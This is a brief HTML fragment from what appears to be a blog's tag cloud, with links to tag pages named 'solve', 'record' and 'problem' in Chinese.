href="/tags/%E8%A7%A3%E5%86%B3/" style="font-size: 10px;">解决</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a> <a href="/tags/%E9%97%AE%E9%A2%98/" style="font-size: 10px;">问题</a>
         </div>
         
 
